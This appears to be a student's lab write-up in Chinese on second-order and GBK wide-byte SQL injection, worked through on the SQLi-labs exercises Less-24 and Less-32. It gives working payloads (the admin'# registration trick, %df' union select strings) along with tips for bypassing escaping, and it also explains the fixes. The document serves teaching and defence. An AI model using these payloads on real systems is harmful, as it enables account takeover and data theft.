## 二、实操过程记录

### 阶段 1：理解二次注入（20 分钟）

二次注入的关键在于「数据流经了两次 SQL」：第一次是写入（做了转义，安全），第二次是把这条数据读出来再用进新语句（没有再转义，危险）。

| 环节 | 代码 | 安全性 |
| --- | --- | --- |
| 注册（写入） | INSERT INTO users(username,password) VALUES('admin\'--','x') | 安全，引号被转义 |
| 修改密码（读取后再拼） | UPDATE users SET password='new' WHERE username='admin'--' | 危险，直接拼接 |
| 实际执行结果 | UPDATE users SET password='new' WHERE username='admin' | 命中了 admin |

与普通注入的区别：普通注入是「输入直接进 SQL」；二次注入是「输入先存库，之后被别的功能取出再拼进 SQL」。

所以扫描器很难发现它——第一次请求完全合法，恶意内容藏在数据库里。

### 阶段 2：二次注入实战（50 分钟）

Less-24 是一个注册 / 登录 / 改密码的小系统。利用路径：注册一个名为 admin'# 的账号 → 用它能登录 → 改密码 → 实际改的是 admin 的密码。

```text
# 1. 注册
username: admin'#
password: 123456
# 2. 用注册的账号登录
username: admin'#
password: 123456
# 3. 在「修改密码」页面把密码改成 hacked123
# 4. 用 admin / hacked123 登录验证
```
注册结果：提示注册成功，用户名显示为 admin'#。

修改密码结果：提示密码修改成功。

admin 登录结果：用 admin / hacked123 登录成功，说明被改的是 admin 而不是 admin'#。

原理：# 在 MySQL 里是注释，UPDATE ... WHERE username='admin'#' 实际等价于 WHERE username='admin'。

### 阶段 3：宽字节注入原理（25 分钟）

当数据库是 GBK 编码时，addslashes 把 ' 转义成 \'（%5c%27）。但如果输入里先塞一个 %df，GBK 会把 %df%5c 当成一个汉字（運），反斜杠被「吃掉」，剩下的 %27 就恢复成真正的单引号。

```bash
# 正常转义
输入 ' → 变成 \' → %5c%27 → 单引号失效
# 宽字节吃掉反斜杠
输入 %df' → 变成 %df%5c%27 → GBK 解析 %df%5c = 運 → 剩 %27 = '
# 验证汉字
python -c "print(b'\xdf\x5c'.decode('gbk'))"
```
%df%5c 对应的汉字：運（U+904B）。

成立条件：数据库/连接编码为 GBK 或 GB2312，且程序用了 addslashes 这类「加反斜杠」的转义方式。

### 阶段 4：宽字节注入实战（40 分钟）

Less-32 用 addslashes，正是宽字节的典型场景。先用 %df' 确认单引号逃逸，再按普通注入往下走。

```sql
# 1. 正常输入单引号，观察被转义
?id=1'
# 2. 输入 %df'，观察单引号逃逸
?id=1%df'
# 3. 构造完整 payload
?id=-1%df' union select 1,2,3--+
?id=-1%df' union select database(),user(),version()--+
```
正常输入 ' 的结果：页面报错并显示 \'，说明转义生效。

输入 %df' 的结果：报错信息里出现「運'」，单引号逃逸成功。

成功的 payload：?id=-1%df' union select 1,2,3--+，回显 1/2/3。

库名：security；用户：root@localhost。

### 阶段 5：两种注入的适用场景对比

| 维度 | 二次注入 | 宽字节注入 |
| --- | --- | --- |
| 绕过的是什么 | 「取出后未再转义」的逻辑缺陷 | 「GBK + addslashes」的编码缺陷 |
| 前提条件 | 数据会被再次拼进 SQL | 数据库编码为 GBK/GB2312 |
| 典型位置 | 注册→改密、留言→审核 | 搜索、id 参数等一切 GET 点 |
| 发现难度 | 高（扫描器难覆盖） | 中（需判断编码） |
| 修复 | 取出后同样参数化 | 统一 UTF-8 + 参数化查询 |

共同点：两者都绕开了「输入处转义」这道防线——一个绕在时间上，一个绕在字节上。

### 阶段 6：避坑记录

| 坑点 | 症状 | 解决办法 |
| --- | --- | --- |
| # 不生效 | 改密没影响 admin | 确认 MySQL 支持 # 注释，或换 -- 加空格 |
| 注册名被过滤 | 注册失败 | 换编码形式或调整注释符 |
| 宽字节无反应 | %df 没效果 | 确认数据库编码是 GBK，UTF-8 下无效 |
| %df 被二次编码 | 变 %25df | 用 Burp 直接发原始字节，别让浏览器编码 |

Q：为什么二次注入扫描器发现不了？A：两次请求各自都合法，恶意语义只在数据库内部成立。

Q：宽字节现在还有吗？A：现代应用统一 UTF-8 后基本消失，但老系统和某些 CMS 里仍能见到。

## 三、实践心得

1. 这两种注入让我明白「转义」不是安全边界。转义只在「输入立刻进入同一条 SQL」时有效，一旦数据在数据库里住过一晚，或者编码方式把反斜杠吃掉，防线就没了。

2. 二次注入最值得警惕的是它的隐蔽性：第一次请求完全正常，日志里也看不出问题，危害发生在第二个功能里。

3. 宽字节是编码层面的漏洞，本质是「两个系统对同一串字节的解释不一致」。这类问题在安全里到处都是——编码、解析、大小写。

## 四、重点与难点

1. 必须记住的知识点

① 二次注入：存入时安全，取出后拼接时危险。

② 宽字节注入成立的两个条件：GBK/GB2312 编码 + 反斜杠式转义（addslashes）。

③ %df%5c 在 GBK 下是一个汉字（運），反斜杠被吞掉。

④ 两者的根治方案都是参数化查询，而不是加更多转义。

2. 踩过的坑

① Less-24 里用 # 注释，浏览器地址栏直接把 # 后面的内容当锚点丢了，改用 Burp 或表单提交。

② 宽字节测试时用浏览器地址栏输入 %df，被浏览器二次编码成 %25df，怎么都不生效。

③ 一度以为宽字节对所有数据库都有效，实际上 UTF-8 环境下完全不成立。

3. 需要补的课

① 补课：GBK、UTF-8、latin1 在字节层面的差异。

② 补课：addslashes、mysql_real_escape_string、参数化查询三者的区别。

③ 预习：Week 7 XSS 进阶与 CSRF，从「打数据库」转向「打浏览器与用户」。

## 六、今日总结

今天两种注入都在绕「转义」：二次注入绕在时间维度（存进去再用），宽字节绕在字节维度（编码吃掉反斜杠）。

共同的教训是：转义只能解决「当次拼接」的问题。只要数据还要被再次使用，或者系统和数据库对字节的解释不一致，这道防线就不成立。

Week 6 到此结束。注入这一路从 Union → 盲注 → 报错 → 绕过 → 二次/宽字节，本质上都是在回答同一个问题：数据怎么被当成代码。
